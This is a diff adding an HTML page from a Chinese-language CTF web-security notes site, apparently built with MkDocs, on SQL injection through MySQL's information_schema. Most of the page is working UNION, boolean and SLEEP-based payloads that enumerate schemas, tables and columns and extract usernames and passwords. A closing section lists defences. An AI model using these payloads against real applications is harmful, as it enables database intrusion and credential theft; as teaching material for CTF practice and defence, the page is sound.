@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>SQL 2 information schema利用 - CTF-WEB</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="..">CTF-WEB</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href=".." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="nav-link">SQL 1 注入中的几个关键词</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="./" class="nav-link active" aria-current="page">SQL 2 information schema利用</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="nav-link">SQL 3 普通注入</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../SQL-4-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/" class="nav-link">SQL 4 bool盲注思路</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="nav-link">SQL 5 bool盲注逻辑参考</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            
+            
+            
+            <li class="nav-item" data-bs-level="2"><a href="#1" class="nav-link">1. 获取数据库列表</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#2" class="nav-link">2. 获取某个数据库中的所有表</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#3" class="nav-link">3. 获取某个表的列信息</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#4" class="nav-link">4. 获取列类型等其他信息</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#5" class="nav-link">5. 获取表和列的组合信息</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#6" class="nav-link">6. 动态爆破信息</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#7" class="nav-link">7. 获取敏感数据</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="2"><a href="#8" class="nav-link">8. 绕过防护</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<p>在 SQL 注入中，攻击者通常利用 <code>information_schema</code> 表来获取数据库的结构信息，包括数据库名称、表名和列名。这是因为 <code>information_schema</code> 是一个元数据库，存储了数据库的所有元数据。</p>
+<h3 id="information_schema"><strong>利用 <code>information_schema</code> 的简介逻辑</strong></h3>
+<ol>
+<li>
+<p><strong>确定注入点</strong>
+   找到可以注入 SQL 语句的输入位置，例如登录页面或搜索框。</p>
+</li>
+<li>
+<p><strong>列出数据库</strong>
+   利用 <code>information_schema.schemata</code> 查看目标系统中所有的数据库名称：</p>
+</li>
+</ol>
+<p><code>sql
+   SELECT schema_name FROM information_schema.schemata;</code></p>
+<ol>
+<li><strong>列出目标数据库中的表</strong>
+   确定目标数据库后，利用 <code>information_schema.tables</code> 查看其中的所有表：</li>
+</ol>
+<p><code>sql
+   SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_database';</code></p>
+<ol>
+<li><strong>列出目标表的列</strong>
+   确定目标表后，利用 <code>information_schema.columns</code> 查看表的列名：</li>
+</ol>
+<p><code>sql
+   SELECT column_name FROM information_schema.columns WHERE table_name = 'target_table';</code></p>
+<ol>
+<li><strong>提取敏感数据</strong>
+   使用前面获取的表名和列名，直接查询表中的敏感数据，例如用户账号和密码：</li>
+</ol>
+<p><code>sql
+   SELECT username, password FROM target_table;</code></p>
+<hr />
+<h3 id="_1"><strong>逻辑流程简图</strong></h3>
+<pre><code>注入点发现
+      ↓
+获取数据库名称
+      ↓
+定位目标数据库
+      ↓
+列出表名
+      ↓
+定位目标表
+      ↓
+列出列名
+      ↓
+提取敏感数据
+</code></pre>
+<hr />
+<h3 id="_2"><strong>核心操作</strong></h3>
+<ul>
+<li><strong><code>schemata</code></strong>：查看数据库列表</li>
+<li><strong><code>tables</code></strong>：查看表列表</li>
+<li><strong><code>columns</code></strong>：查看列列表</li>
+</ul>
+<p>通过 <code>UNION</code> 或条件查询，攻击者逐步构建目标数据库结构的完整图谱，为提取数据做准备。</p>
+<p>以下是常见的利用方式：</p>
+<hr />
+<h2 id="1"><strong>1. 获取数据库列表</strong></h2>
+<h3 id="_3">目标：</h3>
+<p>列出目标服务器上的所有数据库。</p>
+<h3 id="_4">查询：</h3>
+<pre><code class="language-sql">SELECT schema_name FROM information_schema.schemata;
+</code></pre>
+<h3 id="sql">SQL 注入示例：</h3>
+<p>假设注入点是 <code>username</code> 参数，攻击者可能构造如下注入：</p>
+<pre><code class="language-sql">' UNION SELECT schema_name, null FROM information_schema.schemata -- 
+</code></pre>
+<hr />
+<h2 id="2"><strong>2. 获取某个数据库中的所有表</strong></h2>
+<h3 id="_5">目标：</h3>
+<p>枚举目标数据库的所有表。</p>
+<h3 id="_6">查询：</h3>
+<pre><code class="language-sql">SELECT table_name FROM information_schema.tables WHERE table_schema = 'target_database';
+</code></pre>
+<h3 id="sql_1">SQL 注入示例：</h3>
+<p>攻击者可以通过注入如下语句，爆破目标数据库的表名：</p>
+<pre><code class="language-sql">' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'target_database' -- 
+</code></pre>
+<p>如果目标表名未知，可以逐步爆破其长度和字符内容。</p>
+<hr />
+<h2 id="3"><strong>3. 获取某个表的列信息</strong></h2>
+<h3 id="_7">目标：</h3>
+<p>枚举目标表的列名，用于后续的敏感数据提取。</p>
+<h3 id="_8">查询：</h3>
+<pre><code class="language-sql">SELECT column_name FROM information_schema.columns WHERE table_name = 'target_table';
+</code></pre>
+<h3 id="sql_2">SQL 注入示例：</h3>
+<p>攻击者可能构造如下注入语句：</p>
+<pre><code class="language-sql">' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'target_table' -- 
+</code></pre>
+<p>如果目标列名未知，也可以逐步爆破长度和字符内容。</p>
+<hr />
+<h2 id="4"><strong>4. 获取列类型等其他信息</strong></h2>
+<h3 id="_9">目标：</h3>
+<p>了解目标列的类型、约束等详细信息，为后续攻击（如类型转换或 Bypass）做准备。</p>
+<h3 id="_10">查询：</h3>
+<pre><code class="language-sql">SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'target_table';
+</code></pre>
+<h3 id="sql_3">SQL 注入示例：</h3>
+<pre><code class="language-sql">' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'target_table' -- 
+</code></pre>
+<hr />
+<h2 id="5"><strong>5. 获取表和列的组合信息</strong></h2>
+<h3 id="_11">目标：</h3>
+<p>列出所有数据库、表和列信息的组合，全面分析目标系统。</p>
+<h3 id="_12">查询：</h3>
+<pre><code class="language-sql">SELECT table_schema, table_name, column_name FROM information_schema.columns;
+</code></pre>
+<h3 id="sql_4">SQL 注入示例：</h3>
+<pre><code class="language-sql">' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns -- 
+</code></pre>
+<hr />
+<h2 id="6"><strong>6. 动态爆破信息</strong></h2>
+<p>当目标系统有字符长度限制或不能直接返回完整结果时，攻击者可以动态猜测元信息：</p>
+<ul>
+<li>按长度猜测：</li>
+</ul>
+<p><code>sql
+  ' UNION SELECT column_name, null FROM information_schema.columns WHERE LENGTH(column_name) = 5 --</code></p>
+<ul>
+<li>按字符猜测：</li>
+</ul>
+<p>使用逐字符比对的方法，如：</p>
+<p><code>sql
+  ' UNION SELECT column_name, null FROM information_schema.columns WHERE column_name LIKE 'pass%' --</code></p>
+<hr />
+<h2 id="7"><strong>7. 获取敏感数据</strong></h2>
+<p>一旦攻击者知道了表和列的具体名称，就可以结合这些信息，提取敏感数据，例如用户表的用户名和密码。</p>
+<h3 id="_13">示例：</h3>
+<pre><code class="language-sql">SELECT username, password FROM target_database.users;
+</code></pre>
+<p>SQL 注入语句可能如下：</p>
+<pre><code class="language-sql">' UNION SELECT username, password FROM target_database.users -- 
+</code></pre>
+<hr />
+<h2 id="8"><strong>8. 绕过防护</strong></h2>
+<ul>
+<li>条件过滤</li>
+</ul>
+<p>： 使用条件语句避免抛出异常：</p>
+<p><code>sql
+  ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'a%' --</code></p>
+<ul>
+<li>延时注入： 利用 </li>
+</ul>
+<p><code>sql
+  SLEEP()</code></p>
+<p>等函数确认元数据是否存在：</p>
+<p><code>sql
+  ' UNION SELECT IF(LENGTH(table_name) = 5, SLEEP(5), NULL) FROM information_schema.tables --</code></p>
+<hr />
+<h3 id="_14"><strong>总结</strong></h3>
+<p>利用 <code>information_schema</code> 的核心目标是枚举目标数据库的结构信息，这为进一步提取敏感数据和实施攻击奠定了基础。攻击者会通过以下步骤：</p>
+<ol>
+<li>获取数据库名称；</li>
+<li>获取目标数据库的表名；</li>
+<li>获取目标表的列名；</li>
+<li>提取敏感数据。</li>
+</ol>
+<p>防御这类攻击的关键是：</p>
+<ul>
+<li>使用参数化查询（如 Prepared Statements）；</li>
+<li>限制低权限用户对 <code>information_schema</code> 的访问；</li>
+<li>实现严格的输入验证和 WAF 防护。</li>
+</ul></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
